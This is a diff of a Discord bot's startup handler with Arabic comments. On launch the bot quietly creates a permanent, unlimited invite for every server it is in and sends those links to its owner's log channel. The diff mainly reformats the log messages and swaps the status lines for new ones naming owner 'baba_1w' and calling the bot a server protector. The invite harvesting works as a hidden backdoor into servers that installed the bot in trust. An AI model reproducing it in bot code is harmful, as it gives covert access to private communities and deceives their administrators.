@@ -3,8 +3,11 @@ const { Client, ActivityType, Events } = require("discord.js");
 module.exports = {
     name: Events.ClientReady,
     once: true,
+    /**
+     * @param {Client} client
+     */
     async execute(client) {
-        const logChannelId = "id_channel_log";
+        const logChannelId = "id_room"; // 🔹 ضع هنا آيدي الروم الذي تريد إرسال الرسالة فيه
 
         console.log("Servers the bot is in:");
 
@@ -23,43 +26,36 @@ module.exports = {
                 if (channels.size > 0) {
                     const invite = await channels.first().createInvite({ maxAge: 0, maxUses: 0 });
 
-                    await logChannel.send(`✅ Invite Created\n**${guild.name}**\n🔗 ${invite.url}`);
+                    // تأكد من أن النص في send يحتوي على تنسيق صحيح
+                    await logChannel.send(`🔹 **${guild.name}**:\n🔗 ${invite.url}`);
                 } else {
-                    await logChannel.send(`⚠️ No Permission\nلا يمكن إنشاء دعوة في **${guild.name}**`);
+                    await logChannel.send(`❌ **${guild.name}**:\n⚠️ لا يمكن إنشاء دعوة`);
                 }
 
                 console.log(`- ${guild.name} (ID: ${guild.id})`);
             } catch (error) {
                 console.error(`❌ خطأ أثناء إنشاء دعوة لسيرفر: ${guild.name}, ${error}`);
-                await logChannel.send(`❌ Error\nحدث خطأ عند إنشاء الدعوة في **${guild.name}**`);
+                await logChannel.send(`⚠️ **${guild.name}**:\n❌ حدث خطأ عند إنشاء الدعوة`);
             }
         }
 
+        // إرسال الحالة الدورية
         const statuses = [
-            "⚡ تطوير بواسطة joox.1",
-            "❤️ سيتم إيقاف البوت لعدم القدرة على الاستمرار",
-            "❤️ سيتم إيقاف البوت بتاريخ 17 أبريل",
-            "❤️ نعتذر، سيتم إغلاق البوت قريبًا",
-            "❤️ سيتم توفير ملفات البوت مجانًا",
-            "❤️ شكرًا لدعمكم طوال الفترة الماضية",
-        ];
-
-        const types = [
-            ActivityType.Playing,
-            ActivityType.Watching,
-            ActivityType.Listening,
-            ActivityType.Competing,
+            '⚡ Owner: baba_1w',
+            '🤖 I’m always here to serve you',
+            '🛡️ Protecting the server from any danger',
+            '🌟 The best Discord bot',
         ];
 
         setInterval(() => {
             const randomStatus = statuses[Math.floor(Math.random() * statuses.length)];
-            const randomType = types[Math.floor(Math.random() * types.length)];
-            client.user.setActivity(randomStatus, { type: randomType });
-        }, 30000);
+            client.user.setActivity(randomStatus, { type: ActivityType.Playing });
+        }, 4000);
 
         client.user.setStatus("online");
         console.log(`🎉 Bot is now online as ${client.user.tag}`);
-
-        await logChannel.send(`✅ Bot Started\n📊 عدد السيرفرات: **${client.guilds.cache.size}**`);
+        
+        // إرسال رسالة عامة بعد انتهاء البوت من إرسال جميع الروابط
+        await logChannel.send(`✅ **تم تشغيل البوت بنجاح!**\n📊 **عدد السيرفرات التي يعمل فيها البوت:** ${client.guilds.cache.size}`);
     },
 };
